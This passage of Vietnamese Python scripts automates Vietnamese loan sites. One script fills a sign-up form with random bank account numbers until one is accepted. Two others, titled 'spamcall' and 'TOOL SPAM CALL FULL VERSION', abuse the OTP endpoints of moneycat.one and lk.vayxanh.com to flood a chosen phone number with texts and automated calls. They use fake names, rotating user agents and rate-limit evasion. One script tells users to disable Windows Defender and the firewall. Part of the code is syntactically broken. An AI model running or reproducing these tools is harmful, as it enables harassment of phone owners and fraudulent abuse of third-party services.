            print(f"✅ Đã chuyển sang: {current_url}")
            da_chuyen = True
            break
        if i == 5:
            print("   ⚠️ Vẫn đang đợi, thử click lại...")
            click_dang_ky_ngay(driver)
        if i == 10:
            print("   ⚠️ Đợi lâu hơn, kiểm tra lại...")
    
    if not da_chuyen:
        print(f"⚠️ Không chuyển được trang, URL hiện tại: {driver.current_url}")
        print("⚠️ Thử lại lần cuối...")
        click_dang_ky_ngay(driver)
        time.sleep(5)
        if "reg" in driver.current_url:
            print(f"✅ Đã chuyển sau khi thử lại: {driver.current_url}")
        else:
            print("❌ VẪN KHÔNG CHUYỂN ĐƯỢC TRANG!")
            return False
    
    time.sleep(2)
    
    print("\n📝 TRANG ĐĂNG KÝ CÁ NHÂN")
    time.sleep(3)
    
    for _ in range(5):
        driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
        time.sleep(0.2)
    
    dong_popup(driver)
    time.sleep(1)
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "input"))
        )
    except:
        pass
    
    inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📝 Tìm thấy {len(inputs)} input ở trang cá nhân")
    
    if len(inputs) >= 2:
        try:
            if inputs[0].is_displayed() and inputs[0].is_enabled():
                driver.execute_script("arguments[0].value = '';", inputs[0])
                inputs[0].send_keys(NGAY_SINH)
                print(f"✅ Ngày sinh: {NGAY_SINH}")
            else:
                driver.execute_script("arguments[0].value = arguments[1];", inputs[0], NGAY_SINH)
                print(f"✅ Ngày sinh (JS): {NGAY_SINH}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[0], NGAY_SINH)
            print(f"✅ Ngày sinh (JS): {NGAY_SINH}")
        
        try:
            if inputs[1].is_displayed() and inputs[1].is_enabled():
                driver.execute_script("arguments[0].value = '';", inputs[1])
                inputs[1].send_keys(SO_CCCD)
                print(f"✅ CCCD: {SO_CCCD}")
            else:
                driver.execute_script("arguments[0].value = arguments[1];", inputs[1], SO_CCCD)
                print(f"✅ CCCD (JS): {SO_CCCD}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[1], SO_CCCD)
            print(f"✅ CCCD (JS): {SO_CCCD}")
        time.sleep(1)
    
    try:
        driver.find_element(By.XPATH, "//*[text()='Nam']").click()
        print("✅ Giới tính: Nam")
    except:
        try:
            driver.find_element(By.XPATH, "//*[contains(text(), 'Nam')]").click()
            print("✅ Giới tính: Nam")
        except:
            print("⚠️ Không chọn được giới tính")
    
    comboboxes = driver.find_elements(By.XPATH, "//button[@role='combobox']")
    if len(comboboxes) > 0:
        tinh_thanh = comboboxes[0]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tinh_thanh)
        time.sleep(0.5)
        tinh_thanh.click()
        print("📍 Đã mở dropdown Tỉnh/Thành")
        time.sleep(1)
        try:
            driver.find_element(By.XPATH, "//*[text()='Bac Giang']").click()
            print("✅ Đã chọn: Bắc Giang")
        except:
            driver.find_element(By.XPATH, "//*[contains(text(), 'Bac Giang')]").click()
            print("✅ Đã chọn: Bắc Giang")
        time.sleep(0.5)
    
    print("\n📱 Chọn hãng điện thoại...")
    if len(comboboxes) > 1:
        hieu_dt = comboboxes[1]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", hieu_dt)
        time.sleep(0.5)
        
        for hang in cac_hang:
            try:
                print(f"   🔄 Đang thử: {hang}")
                driver.execute_script("arguments[0].click();", hieu_dt)
                time.sleep(1)
                driver.find_element(By.XPATH, f"//*[text()='{hang}']").click()
                print(f"   ✅ Đã chọn: {hang}")
                time.sleep(1)
                break
            except:
                try:
                    driver.execute_script("arguments[0].click();", hieu_dt)
                    time.sleep(1)
                    driver.find_element(By.XPATH, f"//*[contains(text(), '{hang}')]").click()
                    print(f"   ✅ Đã chọn: {hang}")
                    time.sleep(1)
                    break
                except:
                    print(f"   ❌ Không chọn được {hang}")
                    continue
    
    print("\n📞 Nhập số điện thoại...")
    time.sleep(1)
    
    tat_ca_input_tel = driver.find_elements(By.XPATH, "//input[@type='tel']")
    print(f"📝 Tìm thấy {len(tat_ca_input_tel)} input type=tel")
    
    if len(tat_ca_input_tel) > 2:
        so_nguoi_than = tat_ca_input_tel[2]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_nguoi_than)
        time.sleep(0.5)
        so_nguoi_than.click()
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_nguoi_than)
        so_nguoi_than.send_keys(SO_DT_NGUOI_THAN)
        print(f"✅ Số người thân: {SO_DT_NGUOI_THAN}")
    
    if len(tat_ca_input_tel) > 3:
        so_tuyen_dung = tat_ca_input_tel[3]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tuyen_dung)
        time.sleep(0.5)
        so_tuyen_dung.click()
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_tuyen_dung)
        so_tuyen_dung.send_keys(SO_DT_TUYEN_DUNG)
        print(f"✅ Số tuyển dụng: {SO_DT_TUYEN_DUNG}")
    
    print("\n🏦 Chọn Tên Ngân Hàng...")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight - 400);")
    time.sleep(2)
    
    tat_ca_combobox = driver.find_elements(By.XPATH, "//button[@role='combobox']")
    print(f"   📍 Tìm thấy {len(tat_ca_combobox)} combobox")
    
    if len(tat_ca_combobox) > 2:
        ngan_hang_combobox = tat_ca_combobox[2]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", ngan_hang_combobox)
        time.sleep(0.5)
        ngan_hang_combobox.click()
        print("   ✅ Đã mở dropdown ngân hàng")
        time.sleep(1.5)
        
        try:
            options = driver.find_elements(By.CSS_SELECTOR, "li[role='option']")
            if not options:
                options = driver.find_elements(By.CSS_SELECTOR, "ul li")
            if not options:
                options = driver.find_elements(By.CSS_SELECTOR, "[role='option']")
            
            if options:
                driver.execute_script("arguments[0].click();", options[0])
                print(f"   ✅ Đã chọn: {options[0].text[:50]}...")
            else:
                driver.find_element(By.XPATH, "//*[contains(text(), 'Vietcombank')]").click()
                print("   ✅ Đã chọn Vietcombank")
            time.sleep(1)
        except Exception as e:
            print(f"   ❌ Lỗi chọn ngân hàng: {e}")
    
    print("\n💰 NHẬP SỐ TÀI KHOẢN (RANDOM 8/9/10 SỐ)")
    
    tat_ca_input_text = driver.find_elements(By.TAG_NAME, "input")
    so_tk_input = None
    
    for inp in reversed(tat_ca_input_text):
        if inp.is_displayed() and inp.is_enabled():
            so_tk_input = inp
            break
    
    if not so_tk_input:
        print("❌ Không tìm thấy ô nhập số tài khoản!")
        return False
    
    thanh_cong = False
    so_lan_thu = 0
    max_lan = 30
    
    while not thanh_cong and so_lan_thu < max_lan:
        so_lan_thu += 1
        so_tk, so_chu_so = random_so_tai_khoan()
        print(f"\n🔄 Thử số {so_lan_thu}/{max_lan}: {so_tk} ({so_chu_so} số)")
        
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tk_input)
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_tk_input)
        so_tk_input.send_keys(so_tk)
        time.sleep(0.5)
        
        driver.execute_script("document.activeElement?.blur(); document.body.click();")
        time.sleep(1)
        
        try:
            tiep_tuc = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
            if tiep_tuc.is_displayed() and tiep_tuc.is_enabled():
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tiep_tuc)
                time.sleep(0.5)
                driver.execute_script("arguments[0].click();", tiep_tuc)
                print(f"   ⏩ Đã ấn Tiếp tục")
                time.sleep(2)
            else:
                print(f"   ❌ Nút Tiếp tục không thể click!")
                continue
        except:
            print(f"   ❌ Không tìm thấy nút Tiếp tục!")
            continue
        
        co_loi = kiem_tra_loi_sau_tiep_tuc(driver)
        
        if co_loi:
            print(f"   ❌ Số {so_tk} không hợp lệ. Thử số khác...")
        else:
            try:
                tiep_tuc_check = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
                print(f"   ⚠️ Vẫn còn nút Tiếp tục, thử lại...")
                continue
            except:
                thanh_cong = True
                print(f"\n🎉 THÀNH CÔNG! Số {so_tk} ({so_chu_so} số) được chấp nhận!")
                break
    
    if thanh_cong:
        print(f"\n📌 SỐ TÀI KHOẢN LẦN {lan}: {so_tk}")
        
        print("\n⏩ NHẤN TIẾP TỤC LẦN CUỐI ĐỂ TIẾP TỤC...")
        time.sleep(2)
        try:
            tiep_tuc_lan_cuoi = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tiep_tuc_lan_cuoi)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", tiep_tuc_lan_cuoi)
            print("✅ Đã nhấn Tiếp tục lần cuối, chuyển sang upload ảnh...")
            time.sleep(3)
        except Exception as e:
            print(f"⚠️ Không tìm thấy nút Tiếp tục: {e}")
        
        upload_anh_va_otp(driver, lan)
        return True
    else:
        print(f"\n❌ LẦN {lan} THẤT BẠI!")
        return False

def main_3():
    print("="*60)
    print("MONEYCAT - ĐĂNG KÝ TÀI KHOẢN")
    print("="*60)
    
    if len(sys.argv) >= 2:
        SO_DIEN_THOAI = str(sys.argv[1]).lstrip('0')
        print(f"📞 Số điện thoại từ lệnh: {SO_DIEN_THOAI}")
    else:
        SO_DIEN_THOAI = input("📞 Nhập số điện thoại: ").strip()
        SO_DIEN_THOAI = SO_DIEN_THOAI.lstrip('0')
    
    if len(sys.argv) >= 3:
        SO_LAN_LAP = int(sys.argv[2])
        print(f"🔄 Số lần lặp từ lệnh: {SO_LAN_LAP}")
    else:
        SO_LAN_LAP = int(input("🔄 Nhập số lần lặp: "))
    
    print(f"\n✅ Số điện thoại: {SO_DIEN_THOAI} | Số lần lặp: {SO_LAN_LAP}")
    
    options = Options()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    
    thanh_cong = 0
    that_bai = 0
    
    for lan in range(1, SO_LAN_LAP + 1):
        print(f"\n{'🌟'*30}")
        print(f"🌟 LẦN {lan}/{SO_LAN_LAP}")
        print(f"{'🌟'*30}")
        
        driver = webdriver.Edge(options=options)
        ket_qua = thuc_hien_mot_lan(driver, lan, SO_DIEN_THOAI)
        driver.quit()
        
        if ket_qua:
            thanh_cong += 1
        else:
            that_bai += 1
        
        if lan < SO_LAN_LAP:
            print(f"\n⏳ Đợi 5 giây trước lần {lan+1}...")
            time.sleep(5)
    
    print("\n" + "="*60)
    print("TỔNG KẾT")
    print("="*60)
    print(f"   ✅ Thành công: {thanh_cong}/{SO_LAN_LAP} lần")
    print(f"   ❌ Thất bại: {that_bai}/{SO_LAN_LAP} lần")
    print("="*60)


# ============================================================
# FILE 4
# ============================================================
import subprocess
import sys
import os
import importlib.util

def install_packages():
    packages = ['requests', 'fake-useragent', 'selenium', 'webdriver-manager']
    for package in packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package.replace('-', '_'))
            print(f"✅ {package} đã được cài đặt")
        except ImportError:
            print(f"📦 Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"✅ Đã cài đặt {package}")

install_packages()

import os
import sys
import subprocess
import importlib.util
import requests
import time
import traceback
import random
import shutil
import ctypes
from fake_useragent import UserAgent

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("⚠️ Chương trình chưa chạy với quyền Administrator!")
    print("🔄 Đang yêu cầu quyền admin...")
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    except:
        print("❌ Không thể tự động nâng quyền. Vui lòng chạy với quyền Administrator!")
        sys.exit(1)

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.options import Options as EdgeOptions
from selenium.webdriver.edge.service import Service as EdgeService
from webdriver_manager.microsoft import EdgeChromiumDriverManager

ua = UserAgent()

NAMES_LIST = [
    "Nguyễn Minh Anh", "Trần Quốc Bảo", "Lê Hoàng Nam", "Phạm Gia Huy", "Đỗ Đức Anh",
    "Bùi Minh Quân", "Vũ Thành Đạt", "Hồ Nhật Minh", "Phan Tuấn Kiệt", "Nguyễn Quốc Trung",
    "Trần Đức Duy", "Lý Hoàng Phúc", "Võ Minh Tâm", "Đặng Gia Bảo", "Nguyễn Anh Tuấn",
    "Trần Minh Khang", "Phạm Quốc Huy", "Lê Đức Thành", "Ngô Minh Trí", "Dương Anh Khoa",
    "Đinh Gia Hưng", "Hoàng Minh Đức", "Phạm Tuấn Anh", "Nguyễn Hoàng Long", "Trần Gia Huy",
    "Lê Minh Tuấn", "Phan Quốc Việt", "Vũ Minh Hoàng", "Bùi Anh Dũng", "Đỗ Gia Bảo"
]

EMAIL = "nguyenhuuminhdz9@gmail.com"
LOAN_AMOUNT = "2500000"
OTP_URL = "https://moneycat.one/ajax/otp/send-otp"

if len(sys.argv) < 3:
    print("❌ Cách dùng: python spamcall.py [SĐT] [Số lần gửi OTP]")
    print("   Ví dụ: python spamcall.py 0988888866 50")
    sys.exit(1)

PHONE = sys.argv[1].strip()
try:
    CYCLES = int(sys.argv[2])
except ValueError:
    print("❌ Số lần phải là số nguyên!")
    sys.exit(1)

if not PHONE.isdigit() or len(PHONE) not in [10, 11]:
    print("❌ SĐT không hợp lệ!")
    sys.exit(1)

print(f"\n📱 SĐT: {PHONE}")
print(f"📧 Email: {EMAIL}")
print(f"💰 Tiền vay: {int(LOAN_AMOUNT):,} VND")
print(f"🔄 Số lần gửi OTP: {CYCLES} (mỗi lần chỉ 1 OTP, chỉ đổi tên)")

def nhap_thong_tin(driver):
    print("\n🔍 Đang tìm các ô nhập liệu...")
    time.sleep(0.5)
    
    all_inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📋 Tổng số input: {len(all_inputs)}")
    
    name_field = None
    try:
        name_field = driver.find_element(By.ID, "full_name")
        print("\n✅ Tìm thấy ô tên theo ID: full_name")
    except:
        pass
    
    if not name_field:
        for inp in all_inputs:
            try:
                input_name = inp.get_attribute("name") or ""
                input_id = inp.get_attribute("id") or ""
                input_placeholder = inp.get_attribute("placeholder") or ""
                if "name" in input_name or "full" in input_id or "tên" in input_placeholder.lower():
                    name_field = inp
                    print("\n✅ Tìm thấy ô tên theo attribute")
                    break
            except:
                pass
    
    if name_field:
        try:
            print("📝 Đang nhập họ tên...")
            driver.execute_script("arguments[0].value = arguments[1];", name_field, FULLNAME)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", name_field)
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", name_field)
            print(f"✅ Đã nhập: {FULLNAME}")
            time.sleep(2)
        except Exception as e:
            print(f"⚠️ Lỗi nhập tên: {e}")
    else:
        print("⚠️ Không tìm thấy ô nhập tên")
    
    phone_field = None
    for inp in all_inputs:
        try:
            if inp.get_attribute("type") == "tel":
                phone_field = inp
                print("\n✅ Tìm thấy ô SĐT theo type='tel'")
                break
        except:
            pass
    
    if not phone_field:
        for inp in all_inputs:
            try:
                input_name = inp.get_attribute("name") or ""
                input_placeholder = inp.get_attribute("placeholder") or ""
                input_id = inp.get_attribute("id") or ""
                if "phone" in input_name or "mobile" in input_name or "điện" in input_placeholder.lower() or "phone" in input_id:
                    phone_field = inp
                    print("\n✅ Tìm thấy ô SĐT theo attribute")
                    break
            except:
                pass
    
    if phone_field:
        try:
            print("📞 Đang nhập số điện thoại...")
            driver.execute_script("arguments[0].value = arguments[1];", phone_field, PHONE)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", phone_field)
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", phone_field)
            print(f"✅ Đã nhập: {PHONE}")
            time.sleep(2)
        except Exception as e:
            print(f"⚠️ Lỗi nhập SĐT: {e}")
    else:
        print("⚠️ Không tìm thấy ô nhập SĐT")
    
    email_field = None
    for inp in all_inputs:
        try:
            if inp.get_attribute("type") == "email":
                email_field = inp
                print("\n✅ Tìm thấy ô Email theo type='email'")
                break
        except:
            pass
    
    if not email_field:
        for inp in all_inputs:
            try:
                input_name = inp.get_attribute("name") or ""
                if "email" in input_name:
                    email_field = inp
                    print("\n✅ Tìm thấy ô Email theo name")
                    break
            except:
                pass
    
    if email_field:
        try:
            print("📧 Đang nhập email...")
            driver.execute_script("arguments[0].value = arguments[1];", email_field, EMAIL)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", email_field)
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", email_field)
            print(f"✅ Đã nhập: {EMAIL}")
            time.sleep(2)
        except Exception as e:
            print(f"⚠️ Lỗi nhập email: {e}")
    else:
        print("⚠️ Không tìm thấy ô nhập email")
    
    checkbox = None
    for inp in all_inputs:
        try:
            if inp.get_attribute("type") == "checkbox":
                checkbox = inp
                break
        except:
            pass
    
    if checkbox:
        try:
            print("\n✅ Đang tick checkbox...")
            if not checkbox.is_selected():
                driver.execute_script("arguments[0].click();", checkbox)
                time.sleep(2)
            print("✅ Đã tick checkbox")
        except Exception as e:
            print(f"⚠️ Lỗi tick checkbox: {e}")
    else:
        print("⚠️ Không tìm thấy checkbox")
    
    try:
        print("\n🖱️ Đang nhấn nút ĐĂNG KÝ...")
        buttons = driver.find_elements(By.TAG_NAME, "button")
        register_btn = None
        for btn in buttons:
            if "ĐĂNG KÝ" in btn.text.upper():
                register_btn = btn
                break
        if register_btn:
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", register_btn)
            time.sleep(2)
            for i in range(3):
                driver.execute_script("arguments[0].click();", register_btn)
                print(f"   ✅ Lần {i+1}/3")
                time.sleep(2)
            print("✅ Đã nhấn ĐĂNG KÝ 3 lần")
        else:
            print("⚠️ Không tìm thấy nút ĐĂNG KÝ")
    except Exception as e:
        print(f"⚠️ Lỗi nhấn nút: {e}")
    
    time.sleep(2)

def gui_otp(driver):
    try:
        session = requests.Session()
        for cookie in driver.get_cookies():
            session.cookies.set(cookie['name'], cookie['value'])
        
        random_ua = ua.random
        session.headers.update({'User-Agent': random_ua})
        
        data = {'phone': PHONE, 'email': EMAIL}
        response = session.post(OTP_URL, data=data, timeout=5)
        print(f"📨 OTP Status: {response.status_code}")
        if response.status_code == 200:
            return True, "Thành công"
        else:
            return False, f"Lỗi {response.status_code}: {response.text[:50]}"
    except Exception as e:
        return False, f"Lỗi kết nối: {str(e)[:50]}"

def mo_tab_moi(driver):
    print("\n🔄 Đang mở tab mới...")
    tab_hien_tai = driver.current_window_handle
    driver.execute_script("window.open('');")
    time.sleep(2)
    cac_tab = driver.window_handles
    tab_moi = cac_tab[-1]
    driver.switch_to.window(tab_moi)
    print(f"✅ Đã chuyển sang tab mới. Tổng số tab: {len(cac_tab)}")
    driver.switch_to.window(tab_hien_tai)
    driver.close()
    print("✅ Đã đóng tab cũ")
    driver.switch_to.window(tab_moi)
    print("✅ Đã sẵn sàng ở tab mới")
    return tab_moi

def find_edge_path():
    paths = [
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe")
    ]
    
    for path in paths:
        if os.path.exists(path):
            return path
    
    edge = shutil.which("msedge") or shutil.which("msedge.exe")
    if edge:
        return edge
    
    return None

def main_4():
    print("\n" + "="*80)
    print("🚀 MONEYCAT AUTO - 1 OTP/LẦN + MỞ TAB MỚI + GIẢM SLEEP")
    print("="*80)
    print(f"📱 SĐT: {PHONE}")
    print(f"📧 Email: {EMAIL}")
    print(f"🔄 Số lần gửi OTP: {CYCLES}")
    print("="*80)

    edge_path = find_edge_path()
    if edge_path:
        print(f"✅ Tìm thấy Edge tại: {edge_path}")
    else:
        print("⚠️ Không tìm thấy Edge, thử dùng mặc định...")

    print("📥 Đang tải/cập nhật Edge WebDriver...")
    
    try:
        driver_path = EdgeChromiumDriverManager().install()
        print(f"✅ WebDriver đã tải tại: {driver_path}")
        service = EdgeService(driver_path)
    except Exception as e:
        print(f"⚠️ Lỗi webdriver-manager: {e}")
        print("🔄 Thử cách 2: Tìm driver có sẵn...")
        
        driver_path = None
        possible_paths = [
            os.path.join(os.getcwd(), "msedgedriver.exe"),
            "C:\\Windows\\System32\\msedgedriver.exe",
            os.path.expanduser("~\\Downloads\\msedgedriver.exe"),
            shutil.which("msedgedriver")
        ]
        
        for path in possible_paths:
            if path and os.path.exists(path):
                driver_path = path
                break
        
        if driver_path:
            print(f"✅ Tìm thấy driver tại: {driver_path}")
            service = EdgeService(driver_path)
        else:
            print("❌ Không tìm thấy driver!")
            print("\n🔧 Hướng dẫn khắc phục:")
            print("1. Tải driver từ: https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/")
            print("2. Đặt file msedgedriver.exe vào thư mục hiện tại")
            print("3. Hoặc chạy: pip install webdriver-manager --upgrade")
            return

    options = EdgeOptions()
    
    if edge_path:
        options.binary_location = edge_path
    
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--remote-debugging-port=9222")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_experimental_option("useAutomationExtension", False)
    
    try:
        print("🚀 Đang khởi động Edge...")
        driver = webdriver.Edge(service=service, options=options)
        print("✅ Edge đã khởi động thành công!")
    except Exception as e:
        print(f"❌ Lỗi khởi động Edge: {e}")
        print("\n🔧 Cách khắc phục:")
        print("1. Tắt Windows Defender Real-time Protection")
        print("2. Tắt Firewall tạm thời")
        print("3. Cập nhật Edge lên phiên bản mới nhất")
        print("4. Chạy lại với quyền Admin")
        return

    total_success = 0
    total_fail = 0

    try:
        print("🌐 Đang truy cập moneycat.one...")
        driver.get("https://moneycat.one/")
        time.sleep(2)

        for chu_ky in range(1, CYCLES + 1):
            global FULLNAME
            FULLNAME = random.choice(NAMES_LIST)

            print(f"\n{'='*80}")
            print(f"🎯 LẦN {chu_ky}/{CYCLES}")
            print(f"👤 Tên: {FULLNAME}")
            print(f"{'='*80}")

            try:
                slider = driver.find_element(By.CSS_SELECTOR, "input[type='range']")
                driver.execute_script("arguments[0].value = arguments[1];", slider, LOAN_AMOUNT)
                driver.execute_script("arguments[0].dispatchEvent(new Event('input'));", slider)
                driver.execute_script("arguments[0].dispatchEvent(new Event('change'));", slider)
                print(f"✅ Đã điều chỉnh: {int(LOAN_AMOUNT):,} VND")
                time.sleep(0.5)
            except:
                print("⚠️ Không điều chỉnh được số tiền")

            nhap_thong_tin(driver)

            success, message = gui_otp(driver)
            if success:
                total_success += 1
                print(f"✅ Gửi OTP thành công!")
            else:
                total_fail += 1
                print(f"❌ {message}")

            if chu_ky < CYCLES:
                mo_tab_moi(driver)
                print("\n📂 Đang mở moneycat.one trong tab mới...")
                driver.get("https://moneycat.one/")
                time.sleep(0.5)

    except KeyboardInterrupt:
        print("\n\n🛑 ĐÃ DỪNG THEO YÊU CẦU")
    except Exception as e:
        print(f"❌ Lỗi: {e}")
        traceback.print_exc()
    finally:
        try:
            driver.quit()
            print("\n✅ Đã đóng trình duyệt")
        except:
            pass
        
        print("\n" + "="*80)
        print("🏁 HOÀN THÀNH!")
        print(f"Tổng OTP gửi: {CYCLES}")
        print(f"Thành công   : {total_success}")
        print(f"Thất bại     : {total_fail}")
        print("="*80)


# ============================================================
# FILE 5
# ============================================================
import subprocess
import sys
import os

def install_packages():
def main_5():
        packages = ['requests', 'fake-useragent']
        for package in packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                print(f"\033[93m[+] Đang cài đặt {package}...\033[0m")
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])
                print(f"\033[92m[+] Đã cài đặt {package}\033[0m")

    install_packages()

    import requests
    import time
    import random
    import os
    import sys
    from fake_useragent import UserAgent

    os.system('clear' if os.name == 'posix' else 'cls')

    print("\033[94m╔════════════════════════════════════════════════════════════╗\033[0m")
    print("\033[94m║           TOOL SPAM CALL FULL VERSION                      ║\033[0m")
    print("\033[94m╚════════════════════════════════════════════════════════════╝\033[0m")

    if len(sys.argv) >= 2:
        phone = sys.argv[1]
        count = int(sys.argv[2]) if len(sys.argv) >= 3 else 10
        print(f"\033[93m[+] Số điện thoại từ lệnh: {phone}\033[0m")
        print(f"\033[93m[+] Số lần từ lệnh: {count}\033[0m")
    else:
        phone = input("\033[93mNhập số điện thoại cần spam (VD: 0338801915): \033[0m")
        count = int(input("\033[93mNhập số lần gọi (VD: 10): \033[0m"))

    print(f"\n\033[92m[+] Bắt đầu spam {count} cuộc gọi tới {phone}\033[0m")
    print("\033[90m" + "="*60 + "\033[0m\n")

    ua = UserAgent()

    referers = [
        'https://vayxanh.com/',
        'https://vayxanh.com/vay-tien-nhanh/',
        'https://vayxanh.com/dang-ky-vay/',
        'https://google.com/',
        'https://facebook.com/',
        'https://zalo.me/',
        'https://youtube.com/',
        'https://tiktok.com/',
    ]

    for i in range(1, count + 1):
        try:
            random_ua = ua.random
            random_referer = random.choice(referers)
        
            headers = {
                'accept': '*/*',
                'accept-language': 'vi-VN,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json',
                'origin': 'https://lk.vayxanh.com',
                'referer': random_referer,
                'user-agent': random_ua,
                'sec-ch-ua': f'"{random.choice(["Chromium", "Google Chrome", "Microsoft Edge"])}";v="{random.randint(120, 130)}"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': f'"{random.choice(["Android", "iOS", "Windows", "macOS"])}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin'
            }
        
            payload = {
                "data": {
                    "phone": phone,
                    "code": "resend",
                    "channel": "ivr"
                }
            }
        
            session = requests.Session()
        
            session.get(
                f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7&utm_source=direct_vayxanh&utm_medium=organic&utm_campaign=direct_vayxanh&utm_content=mainpage_submit',
                headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'vi-VN,en-US;q=0.9,en;q=0.8',
                    'referer': random_referer,
                    'upgrade-insecure-requests': '1',
                    'user-agent': random_ua,
                    'sec-ch-ua': f'"{random.choice(["Chromium", "Google Chrome", "Microsoft Edge"])}";v="{random.randint(120, 130)}"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': f'"{random.choice(["Android", "iOS", "Windows", "macOS"])}"'
                },
                timeout=10
            )
        
            time.sleep(random.uniform(0.1, 0.5))
        
            response = session.post(
                'https://lk.vayxanh.com/internal/client/otp/send',
                headers=headers,
                json=payload,
                timeout=10
            )
        
            if response.status_code == 200:
                print(f"\033[92m[{i}/{count}] ✓ Gửi yêu cầu gọi thành công\033[0m")
                print(f"\033[90m    → UA: {random_ua[:40]}...\033[0m")
            elif response.status_code == 400:
                try:
                    err = response.json()
                    if 'limit' in str(err).lower() or 'too many' in str(err).lower():
                        print(f"\033[93m[{i}/{count}] ⚠ Bị giới hạn, đang đợi...\033[0m")
                        time.sleep(random.uniform(1, 2))
                        continue
                    else:
                        print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
                        print(f"    → {response.text[:150]}")
                except:
                    print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
                    print(f"    → {response.text[:150]}")
            else:
                print(f"\033[91m[{i}/{count}] ✗ Lỗi: HTTP {response.status_code}\033[0m")
                if response.text:
                    print(f"    → {response.text[:150]}")
        
            if i < count:
                delay = random.uniform(0, 1)
                print(f"\033[90m    → Đợi {delay:.1f}s\033[0m")
                time.sleep(delay)
            
        except requests.exceptions.Timeout:
            print(f"\033[91m[{i}/{count}] ✗ Timeout - Đang thử lại...\033[0m")
            time.sleep(random.uniform(0, 1))
        except requests.exceptions.ConnectionError:
            print(f"\033[91m[{i}/{count}] ✗ Lỗi kết nối - Đang thử lại...\033[0m")
            time.sleep(random.uniform(0, 1))
        except Exception as e:
            print(f"\033[91m[{i}/{count}] ✗ Lỗi: {str(e)}\033[0m")
            time.sleep(random.uniform(0, 1))

    print(f"\n\033[92m" + "="*60)
    print(f"✅ Đã hoàn thành {count} cuộc gọi tới {phone}")
    print("="*60 + "\033[0m")

# ============================================================
# FILE 6
# ============================================================
import subprocess
import sys
import importlib
import os

def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        return True
    except subprocess.CalledProcessError:
        print(f"Loi khi cai dat {package}")
        return False

def check_and_install_dependencies():
    required_packages = {
        'httpx': 'httpx',
        'PIL': 'Pillow',
        'ddddocr': 'ddddocr',
        'Crypto': 'pycryptodome',
        'numpy': 'numpy'
    }
    
    missing_packages = []
    
    print("Dang kiem tra cac thu vien can thiet...")
    
    for module, package in required_packages.items():
        try:
            if module == 'PIL':
                import PIL
            elif module == 'Crypto':
                import Crypto
            else:
                importlib.import_module(module)
            print(f"{package} da duoc cai dat")
        except ImportError:
            print(f"{package} chua duoc cai dat")
            missing_packages.append(package)
    
    if missing_packages:
        print(f"\nDang cai dat: {', '.join(missing_packages)}")
        for package in missing_packages:
            print(f"Dang cai dat {package}...")
            if install_package(package):
                print(f"Da cai dat {package} thanh cong")
            else:
                print(f"Khong the cai dat {package}")
                return False
    else:
        print("\nTat ca thu vien da san sang!")
    
    return True

if check_and_install_dependencies():
    print("\n" + "="*50)
    print("MOI TRUONG DA SAN SANG")
    print("="*50)
